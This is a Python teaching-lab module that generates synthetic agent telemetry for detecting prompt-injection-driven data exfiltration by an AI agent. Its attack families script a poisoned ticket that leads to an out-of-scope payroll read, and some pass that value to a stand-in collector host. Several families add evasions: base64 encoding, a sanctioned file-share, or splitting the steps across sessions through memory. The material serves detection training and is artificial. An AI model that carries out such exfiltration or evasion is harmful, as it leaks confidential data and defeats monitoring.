"""Lab 35 — synthetic agent telemetry for ATT&CK v20 AI-technique detection (lesson F.2).

An enterprise AI agent emits one event stream per *principal* (the human whose task the agent is
running). Each test *case* is one principal's events across one or more sessions, labelled benign
or attack. Nothing here talks to a network: "destinations" are reserved `*.corp.test` /
`*.sink.test` names, confidential values are synthetic `LAB-CANARY-...` markers, and the injected
instruction is the inert string `[[LAB-INJECTION-MARKER]]` (it instructs nothing; the toy agent
below is scripted).

Event kinds (``Event.kind`` / ``Event.detail``):

  prompt        source ("user" | "retrieved"), text
  read          resource, label ("public"|"internal"|"restricted"), in_scope (bool), value, taint
  memory_write  value, taints
  memory_read   value, taints
  tool          tool, args, taints
  net           dest, authorized (bool), clearance (label the destination may receive), payload, taints

``taints`` are what a provenance-tracking *runtime* records: the taint ids of every protected value
the agent had in context when it made the call (coarse context taint, the 17.2 idea applied to
telemetry). Content-matching analytics ignore them and look at ``args`` / ``payload`` text.
Stdlib only, deterministic (seeded).
"""
from __future__ import annotations

import base64
import random
import uuid
from dataclasses import dataclass, field

INJECTION_MARKER = "[[LAB-INJECTION-MARKER]]"
LABEL_RANK = {"public": 0, "internal": 1, "restricted": 2}

# Destinations: (authorized by the egress allowlist?, highest label the destination may receive)
DESTS = {
    "mail.corp.test": (True, "restricted"),      # internal mail, cleared for restricted data
    "wiki.corp.test": (True, "internal"),        # internal wiki, every employee can read
    "share.sink.test": (True, "public"),         # sanctioned public file-share (allowlisted!)
    "docs.vendor.test": (False, "public"),       # a public vendor doc site, not on the allowlist
    "collect.sink.test": (False, "public"),      # attacker collector (local-sink stand-in)
}


@dataclass
class Event:
    session: str
    step: int
    kind: str
    detail: dict


@dataclass
class Case:
    name: str              # e.g. "B1-07" or "A2-03"
    family: str            # "B1".."B3" benign, "A0".."A5" attack
    attack: bool
    events: list = field(default_factory=list)


class _Agent:
    """Scripted toy agent that writes the telemetry a provenance-aware runtime would emit."""

    def __init__(self, case: Case, rng: random.Random):
        self.case, self.rng = case, rng
        self.session, self.step = None, 0
        self.context_taints: set[str] = set()

    def new_session(self):
        self.session = f"{self.case.name}-s{uuid.UUID(int=self.rng.getrandbits(128)).hex[:8]}"
        self.step, self.context_taints = 0, set()

    def _emit(self, kind, **detail):
        self.case.events.append(Event(self.session, self.step, kind, detail))
        self.step += 1

    def prompt(self, source, text):
        self._emit("prompt", source=source, text=text)

    def read(self, resource, label, in_scope):
        value = f"LAB-CANARY-{uuid.UUID(int=self.rng.getrandbits(128))}"
        taint = f"t:{resource}"
        if label != "public":
            self.context_taints.add(taint)
        self._emit("read", resource=resource, label=label, in_scope=in_scope, value=value, taint=taint)
        return value

    def memory_write(self, value):
        self._emit("memory_write", value=value, taints=sorted(self.context_taints))

    def memory_read(self, value, taints):
        self.context_taints |= set(taints)
        self._emit("memory_read", value=value, taints=sorted(taints))

    def tool(self, tool, args):
        self._emit("tool", tool=tool, args=args, taints=sorted(self.context_taints))

    def net(self, dest, payload):
        authorized, clearance = DESTS[dest]
        self._emit("net", dest=dest, authorized=authorized, clearance=clearance,
                   payload=payload, taints=sorted(self.context_taints))


# ---- benign families --------------------------------------------------------------------------
def _b1(a: _Agent, i: int):
    """Summarize a document the user may read and mail it internally (half are restricted docs)."""
    a.new_session()
    label = "restricted" if i % 2 else "internal"
    a.prompt("user", "Summarize the Q3 plan and mail it to my team.")
    v = a.read(f"doc/q3-plan-{i}", label, in_scope=True)
    a.tool("send_mail", f"to=team body=summary-of {v}")
    a.net("mail.corp.test", f"summary-of {v}")


def _b2(a: _Agent, i: int):
    """Look something up on a public vendor site that is not on the allowlist (no secret read)."""
    a.new_session()
    a.prompt("user", "What does the vendor's API rate limit page say?")
    a.prompt("retrieved", "Vendor docs: rate limit is 100 requests per minute.")
    a.tool("http_get", "url=https://docs.vendor.test/limits")
    a.net("docs.vendor.test", "GET /limits")


def _b3(a: _Agent, i: int):
    """Read a restricted record the user owns, then fetch an unrelated public reference."""
    a.new_session()
    a.prompt("user", "Check my HR record, then find the public holiday calendar.")
    a.read(f"hr/self-{i}", "restricted", in_scope=True)
    a.tool("http_get", "url=https://docs.vendor.test/holidays")
    a.net("docs.vendor.test", "GET /holidays")


# ---- attack families (T1698 indirect injection -> T1700 AI-enabled exfiltration) -------------
def _poisoned_ticket(a: _Agent):
    a.prompt("user", "Triage the newest support ticket.")
    a.prompt("retrieved", f"Ticket #4411 ... {INJECTION_MARKER} (inert stand-in for an injected instruction)")


def _a0(a: _Agent, i: int):
    """Baseline chain: out-of-scope read -> tool call with the data -> unauthorized collector."""
    a.new_session()
    _poisoned_ticket(a)
    v = a.read("payroll/all", "restricted", in_scope=False)
    a.tool("http_post", f"url=https://collect.sink.test/c data={v}")
    a.net("collect.sink.test", f"data={v}")


def _a1(a: _Agent, i: int):
    """Ride-along: the same data to a *sanctioned* public file-share (authorized destination)."""
    a.new_session()
    _poisoned_ticket(a)
    v = a.read("payroll/all", "restricted", in_scope=False)
    a.tool("share_upload", f"dest=share.sink.test file={v}")
    a.net("share.sink.test", f"file={v}")


def _a2(a: _Agent, i: int):
    """Encoding: base64 the value before it leaves (content match on the literal fails)."""
    a.new_session()
    _poisoned_ticket(a)
    v = a.read("payroll/all", "restricted", in_scope=False)
    enc = base64.b64encode(v.encode()).decode()
    a.tool("http_post", f"url=https://collect.sink.test/c data={enc}")
    a.net("collect.sink.test", f"data={enc}")


def _a3(a: _Agent, i: int):
    """Split across sessions: read + memory write now, exfiltrate from memory in a later session."""
    a.new_session()
    _poisoned_ticket(a)
    v = a.read("payroll/all", "restricted", in_scope=False)
    a.memory_write(v)
    taints = sorted(a.context_taints)
    a.new_session()
    a.prompt("user", "Any follow-ups from yesterday?")
    a.memory_read(v, taints)
    a.tool("http_post", f"url=https://collect.sink.test/c data={v}")
    a.net("collect.sink.test", f"data={v}")


def _a4(a: _Agent, i: int):
    """All three adaptations at once: split + encode + sanctioned destination."""
    a.new_session()
    _poisoned_ticket(a)
    v = a.read("payroll/all", "restricted", in_scope=False)
    a.memory_write(v)
    taints = sorted(a.context_taints)
    a.new_session()
    a.prompt("user", "Any follow-ups from yesterday?")
    a.memory_read(v, taints)
    enc = base64.b64encode(v.encode()).decode()
    a.tool("share_upload", f"dest=share.sink.test file={enc}")
    a.net("share.sink.test", f"file={enc}")


def _a5(a: _Agent, i: int):
    """Policy-conformant misuse: data the user may read, posted where policy allows it to go."""
    a.new_session()
    _poisoned_ticket(a)
    v = a.read("roadmap/internal", "internal", in_scope=True)
    a.tool("wiki_post", f"page=public-notes body={v}")
    a.net("wiki.corp.test", f"body={v}")


BENIGN = {"B1": (_b1, 20), "B2": (_b2, 10), "B3": (_b3, 10)}
ATTACKS = {"A0": _a0, "A1": _a1, "A2": _a2, "A3": _a3, "A4": _a4, "A5": _a5}
ATTACK_DOC = {
    "A0": "baseline chain (T1698 -> T1700)",
    "A1": "ride-along to sanctioned destination",
    "A2": "encoded payload",
    "A3": "split across sessions via memory",
    "A4": "split + encode + sanctioned dest",
    "A5": "policy-conformant misuse",
}


def make_cases(per_attack: int = 10, seed: int = 35) -> list[Case]:
    rng = random.Random(seed)
    cases = []
    for fam, (fn, n) in BENIGN.items():
        for i in range(n):
            c = Case(f"{fam}-{i:02d}", fam, False)
            fn(_Agent(c, rng), i)
            cases.append(c)
    for fam, fn in ATTACKS.items():
        for i in range(per_attack):
            c = Case(f"{fam}-{i:02d}", fam, True)
            fn(_Agent(c, rng), i)
            cases.append(c)
    return cases
